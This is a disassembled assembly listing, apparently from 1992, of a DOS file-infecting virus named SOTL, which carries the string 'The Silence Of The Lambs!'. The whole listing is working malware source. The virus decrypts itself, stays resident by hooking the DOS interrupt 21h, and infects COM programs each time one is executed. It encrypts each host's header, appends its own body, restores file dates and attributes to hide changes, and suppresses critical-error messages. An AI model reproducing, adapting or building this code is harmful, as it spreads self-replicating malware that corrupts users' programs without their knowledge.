

  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        SOTL				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   6-Aug-92					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	84h			; (0000:0084=2381h)
data_2e		equ	86h			; (0000:0086=484h)
data_3e		equ	100h			; (0000:0100=59h)
data_4e		equ	2DFh			; (0000:02DF=0)
data_5e		equ	0			; (728B:0000=0FFh)
data_6e		equ	3			; (728B:0003=0FFFFh)
data_7e		equ	12h			; (728B:0012=0)
data_8e		equ	110h			; (728B:0110=0EBh)
data_9e		equ	0F0h			; (728C:00F0=0)
data_10e	equ	0F2h			; (728C:00F2=0)
data_11e	equ	0F4h			; (728C:00F4=0)
data_12e	equ	0F6h			; (728C:00F6=0)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
sotl		proc	far
  
start:
		jmp	short loc_2		; (0104)
		db	 44h, 59h
loc_2:
		mov	cx,1ECh
		mov	si,offset ds:[114h]	; (728C:0114=0B4h)
		mov	ah,42h			; 'B'
  
locloop_3:
		sub	[si],ah
		inc	si
		add	ah,0C7h
		loop	locloop_3		; Loop if cx > 0
  
		mov	ah,2Dh			; '-'
		mov	ch,0FFh
		mov	dx,cx
		int	21h			; DOS Services  ah=function 2Dh
						;  set time, cx=hrs/min, dh=sec
		cmp	al,0FFh
		jne	loc_4			; Jump if not equal
		mov	ax,cs
		dec	ax
		mov	ds,ax
		cmp	byte ptr ds:data_5e,5Ah	; (728B:0000=0FFh) 'Z'
		nop				;*ASM fixup - sign extn byte
		jne	loc_4			; Jump if not equal
		mov	ax,ds:data_6e		; (728B:0003=0FFFFh)
		sub	ax,62h
		jc	loc_4			; Jump if carry Set
		sub	word ptr ds:data_6e,62h	; (728B:0003=0FFFFh)
		nop				;*ASM fixup - sign extn byte
		sub	word ptr ds:data_7e,62h	; (728B:0012=0)
		nop				;*ASM fixup - sign extn byte
		mov	es,ds:data_7e		; (728B:0012=0)
		mov	si,data_8e		; (728B:0110=0EBh)
		mov	di,data_3e		; (0000:0100=59h)
		mov	cx,200h
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	si,data_1e		; (0000:0084=81h)
		mov	di,data_4e		; (0000:02DF=0)
		movsw				; Mov [si] to es:[di]
		movsw				; Mov [si] to es:[di]
		cli				; Disable interrupts
		mov	ds:data_2e,es		; (0000:0086=484h)
		mov	word ptr ds:data_1e,28Ch	; (0000:0084=2381h)
		sti				; Enable interrupts
loc_4:
		push	cs
		push	cs
		pop	es
		pop	ds
		mov	bx,offset loc_12
		jmp	bx			;*Register jump
loc_5:
		jmp	loc_8			; (0244)
  
sotl		endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		push	cs
		pop	ds
		push	cs
		pop	es
		in	al,40h			; port 40h, 8253 timer 0 clock
		mov	byte ptr ds:[10Bh],al	; (728C:010B=42h)
		mov	ax,4300h
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ds:data_9e,cx		; (728C:00F0=0)
		mov	ax,4301h
		xor	cx,cx			; Zero register
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		xchg	ax,bx
		lahf				; Load ah from flags
		push	ax
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ds:data_10e,cx		; (728C:00F2=0)
		mov	ds:data_11e,dx		; (728C:00F4=0)
		pop	ax
		sahf				; Store ah into flags
		jc	loc_5			; Jump if carry Set
		mov	ah,3Fh			; '?'
		mov	cx,200h
		mov	dx,offset data_19	; (728C:0300=0)
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		cmp	byte ptr data_19,4Dh	; (728C:0300=0) 'M'
		je	loc_5			; Jump if equal
		cmp	byte ptr data_19,5Ah	; (728C:0300=0) 'Z'
		je	loc_5			; Jump if equal
		cmp	data_21,5944h		; (728C:0302=0)
		je	loc_5			; Jump if equal
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		cmp	ah,0FAh
		jae	loc_5			; Jump if above or =
		cmp	ah,4
		jb	loc_5			; Jump if below
		add	ax,300h
		mov	ds:data_12e,ax		; (728C:00F6=0)
		mov	ah,40h			; '@'
		mov	cx,200h
		mov	dx,offset data_19	; (728C:0300=0)
		push	cx
		mov	al,byte ptr ds:[10Bh]	; (728C:010B=42h)
		mov	si,dx
  
locloop_6:
		xor	[si],al
		inc	si
		loop	locloop_6		; Loop if cx > 0
  
		pop	cx
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ah,40h			; '@'
		mov	cx,2Bh
		mov	dx,offset data_18	; (728C:0261=0E8h)
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		mov	ax,4200h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		push	word ptr ds:[16Dh]	; (728C:016D=700h)
		mov	ax,ds:data_12e		; (728C:00F6=0)
		mov	word ptr ds:[16Dh],ax	; (728C:016D=700h)
		mov	ah,byte ptr ds:[10Bh]	; (728C:010B=42h)
		in	al,40h			; port 40h, 8253 timer 0 clock
		mov	byte ptr ds:[111h],al	; (728C:0111=0C7h)
		mov	dl,al
		mov	si,offset ds:[100h]	; (728C:0100=0EBh)
		mov	di,offset data_19	; (728C:0300=0)
		cld				; Clear direction
		mov	cx,14h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	cx,1ECh
  
locloop_7:
		lodsb				; String [si] to al
		add	al,ah
		stosb				; Store al to es:[di]
		add	ah,dl
		loop	locloop_7		; Loop if cx > 0
  
		mov	ah,40h			; '@'
		mov	dx,offset data_19	; (728C:0300=0)
		mov	cx,200h
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		pop	word ptr ds:[16Dh]	; (728C:016D=700h)
loc_8:
		mov	ax,5701h
		mov	cx,ds:data_10e		; (728C:00F2=0)
		mov	dx,ds:data_11e		; (728C:00F4=0)
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		mov	ax,4301h
		mov	cx,ds:data_9e		; (728C:00F0=0)
		xor	dx,dx			; Zero register
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		retn
sub_1		endp
  
data_18		db	0E8h
		db	 00h, 00h, 5Eh, 81h,0EEh, 03h
		db	 02h,0BFh, 00h, 01h,0B9h, 00h
		db	 02h, 8Ah, 26h, 0Bh, 01h
  
locloop_9:
		lodsb				; String [si] to al
		xor	al,ah
		stosb				; Store al to es:[di]
		loop	locloop_9		; Loop if cx > 0
  
		mov	ax,100h
		push	ax
		sub	ax,ax
		xor	bx,bx			; Zero register
		and	cx,cx
		sub	dx,dx
		xor	si,si			; Zero register
		and	di,di
		sub	bp,bp
		retn
		pushf				; Push flags
		cmp	ah,2Dh			; '-'
		jne	loc_10			; Jump if not equal
		cmp	ch,0FFh
		jne	loc_10			; Jump if not equal
		cmp	ch,dh
		jne	loc_10			; Jump if not equal
		mov	al,0
		popf				; Pop flags
		iret				; Interrupt return
loc_10:
		cld				; Clear direction
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	bp
		push	es
		push	ds
		cmp	ax,4B00h
		jne	loc_11			; Jump if not equal
		mov	si,dx
		push	cs
		pop	es
		xor	di,di			; Zero register
		mov	cx,80h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		push	es
		push	bx
		push	cs
		pop	ds
		mov	ax,2524h
		mov	dx,offset int_24h_entry
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		call	sub_1			; (0174)
		pop	dx
		pop	ds
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_11:
		pop	ds
		pop	es
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
;*		jmp	far ptr loc_1		;*(0B10:0317)
		db	0EAh, 17h, 03h, 10h, 0Bh
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
int_24h_entry	proc	far
		mov	al,0
		iret				; Interrupt return
int_24h_entry	endp
  
		db	'The Silence Of The Lambs!$'
data_19		db	0
		db	0
data_21		dw	0
		db	508 dup (0)
		db	0F6h, 4Bh,0F8h, 52h, 43h, 8Fh
		db	 63h,0F6h, 0Eh,0F2h, 42h, 8Fh
		db	 63h,0D2h,0D2h,0D2h, 16h
		db	'*+1b+1b#b6', 27h, '16b-$'
		db	'b#b1/#..bl'
		db	 01h, 0Dh, 0Fh
		db	'b$'
		db	'+.', 27h, 'OHfBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
		db	'BBBBBBBBBBBBBBBBBBBBBBBB'
loc_12:
		call	sub_2			; (0703)
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		pop	si
		sub	si,203h
		mov	di,offset ds:[100h]	; (728C:0100=0EBh)
		mov	cx,200h
		mov	ah,byte ptr ds:[10Bh]	; (728C:010B=42h)
  
locloop_13:
		lodsb				; String [si] to al
		xor	al,ah
		stosb				; Store al to es:[di]
		loop	locloop_13		; Loop if cx > 0
  
		mov	ax,100h
		push	ax
		sub	ax,ax
		xor	bx,bx			; Zero register
		and	cx,cx
		sub	dx,dx
		xor	si,si			; Zero register
		and	di,di
		sub	bp,bp
		retn
sub_2		endp
  
  
seg_a		ends
  
  
  
		end	start

